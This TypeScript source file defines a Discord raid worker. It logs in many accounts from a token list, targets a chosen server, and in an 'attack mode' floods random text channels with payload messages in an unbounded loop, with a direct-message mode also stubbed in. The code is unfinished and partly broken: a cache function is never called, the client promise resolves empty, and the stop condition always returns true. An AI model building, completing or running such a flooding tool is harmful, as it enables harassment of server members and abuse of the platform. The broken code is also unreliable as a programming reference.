import {Client, Guild, TextChannel} from "discord.js";
import App, {AttackMode} from "./app";
import Utils from "./utils";

export default class Worker {
    private readonly app: App;

    private nodes: Client[];

    private guild?: Guild;
    private channel?: TextChannel;
    private channelCache?: TextChannel[];

    public constructor(app: App) {
        this.app = app;
        this.nodes = [];
    }

    public async loadNodes(): Promise<number> {
        this.nodes = [];

        let loaded: number = 0;

        // TODO: Check for successful node creation
        for (let i: number = 0; i < this.app.tokens.length; i++) {
            this.nodes.push(await this.createNode(this.app.tokens[i]));
            loaded++;
        }

        return loaded;
    }

    public async prepare(): Promise<this> {
        let amount: number = this.app.options.PREPARE_NODE_AMOUNT === "all" ? this.app.tokens.length : this.app.options.PREPARE_NODE_AMOUNT;

        if (amount > this.nodes.length) {
            amount = this.nodes.length;
        }

        this.app.log(`Preparing ${amount} node(s) ...`);

        for (let i: number = 0; i < this.nodes.length; i++) {
            if (!this.nodes[i].guilds.has(this.app.options.TARGET_GUILD_ID)) {
                // TODO: Join node by invite here
            }
        }

        return this;
    }

    private populateChannelCache(): this {
        if (!this.guild) {
            throw new Error("[Worker.populateChannelCache] Expecting guild");
        }

        this.channelCache = this.guild.channels.filter((channel: TextChannel) => {
            // TODO: Also check for SEND_MESSAGES permission
            return channel.type === "text";
        });

        return this;
    }

    // TODO: Channels are bound to specific nodes
    private getRandomNodeRandomChannel(): TextChannel {
        if (!this.channelCache) {
            this.populateChannelCache;

            if (!this.channelCache) {
                throw new Error("[Worker.getRandomChannel] Expecting channel cache to be populated");
            }
        }
        
        return this.channelCache[Utils.getRandomInt(0, this.channelCache.length)];
    }

    // TODO: Determine if we can keep sending messages, etc.
    private canContinue(): boolean {
        return true;
    }

    public async start(): Promise<number> {
        let sent: number = 0;

        if (this.app.options.MODE !== AttackMode.DMs && (!this.guild || !this.channel)) {
            throw new Error("[Worker.start] Expecting guild and channel");
        }

        // TODO
        let msgIterator: number = 0;

        switch (this.app.options.MODE) {
            case AttackMode.Random: {
                while (this.canContinue()) {
                    this.sendPayload(this.app.messages[msgIterator]);
                    sent += this.nodes.length;
                }

                break;
            }

            default: {
                throw new Error("[Worker.start] An invalid mode was specified");
            }
        }

        return sent;
    }

    private sendPayload(payload: string): this {
        for (let i: number = 0; i < this.nodes.length; i++) {
            this.getRandomNodeRandomChannel().send(payload);
        }

        return this;
    }

    // TODO: Catch login errors (invalid tokens)
    private async createNode(token: string): Promise<Client> {
        const node: Client = new Client();

        return new Promise((resolve) => {
            node.on("ready", () => {
                resolve();
            });

            node.login(token);
        });
    }
}